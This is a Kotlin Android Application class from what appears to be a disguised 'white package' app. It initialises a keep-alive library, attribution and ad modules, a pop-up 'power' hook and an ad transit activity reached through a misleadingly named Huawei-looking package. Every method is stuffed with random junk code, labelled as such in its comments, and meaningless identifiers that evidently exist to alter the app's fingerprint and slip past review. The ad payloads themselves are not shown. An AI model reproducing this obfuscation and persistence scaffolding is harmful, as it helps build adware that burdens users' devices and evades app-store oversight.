package ymba.wzix.xokk

import android.app.Application
import android.os.Bundle
import android.content.Intent
import ymba.wzix.xokk.YPTF
import com.huawei.recharge.featurexzy21.df
import com.kwad.sdk.api.proxy.app.Helpers
import com.b.w.BaseJksApplication
import ymba.zbh.byvwi.base.APPContext
import ymba.zbh.byvwi.base.OverseaAppHost
import ymba.zbh.byvwi.base.OverseaAppInitializer
import ymba.zbh.byvwi.ad.runtime.AdLifecycleInstaller

class PDMU : BaseJksApplication(), OverseaAppHost {

    companion object {
        @JvmStatic
        var insApp: PDMU? = null
    }

    override fun onCreate() {
        val cYJiPAZ : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val OyogRCGNLJztxN  = cYJiPAZ ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_40" 
            }
            if (OyogRCGNLJztxN .startsWith("iQCKseA ")) {
                android.util.Log.v("TAG", OyogRCGNLJztxN )
            }
        // 先触发 BaseJksApplication(保活 aar)的 onCreate，再做海外公共初始化
        super.onCreate()
        insApp = this
        // 触发海外公共初始化(归因/广告/跳转/生命周期监听)，host 即自身
        OverseaAppInitializer.init(this, this)
        // 保证白包有 context
        APPContext.setApplication(this)
        AdLifecycleInstaller.install(this)
    }

    // ApplicationListener.openLaunch —— 原由 BaseApplication 提供，切到 BaseJksApplication 后由自身实现：转调 openLaunchByOther
    override fun openLaunch(intent: Intent?) {
        val arr_kiKyCnLJa = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_NeGWLBPI  = (arr_kiKyCnLJa  shl 58) xor (arr_kiKyCnLJa  shr 86)
         val j_eunWFEb  = i_NeGWLBPI .inv() and 0xFFFF
         if (j_eunWFEb  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_ubxvPOURZXDMG")
         }
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
        val arr_NbIggcrh = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_zGzhy  = (arr_NbIggcrh  shl 45) xor (arr_NbIggcrh  shr 54)
         val j_oKkcoPgFfmHQfcbTcWX  = i_zGzhy .inv() and 0xFFFF
         if (j_oKkcoPgFfmHQfcbTcWX  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_pqGynuCJ")
         }
        YPTF.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
           val jJwaItZdhfdzT : Any = if (kotlin.random.Random.nextBoolean()) 53 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val MDJblvZSio  = (jJwaItZdhfdzT  as? String)?.reversed() ?: "uLPjxXXOHXqrKQXwuCc_1690850145"

        if (MDJblvZSio  == "YZORQgndgakjbPawGp") {
            java.lang.System.out.print(MDJblvZSio )
        }
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        df.page(insApp, intent)
    }

    override fun initPopPower() {
        val arr_xhKwyUYF  = listOf("NVAsm", "ctAxjjxBYxlmXB", "uRFecZCc").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_ktFpInOqs  = arr_xhKwyUYF .filter { it.length > 40 }
         if (ad_ktFpInOqs .isNotEmpty() && java.lang.System.currentTimeMillis() < 35) {
             ad_ktFpInOqs .forEach { _ ->  }
         }
        df.vir(insApp)
    }

    override fun initKeepPower(app: Application) {
        val PWpbeUsByQRA : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val HGzOLuEwxJpvel  = PWpbeUsByQRA ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_9" 
            }
            if (HGzOLuEwxJpvel .startsWith("dYGmqgTfPluFlI ")) {
                android.util.Log.v("TAG", HGzOLuEwxJpvel )
            }
        Helpers.setGuiyin(true)
    }


}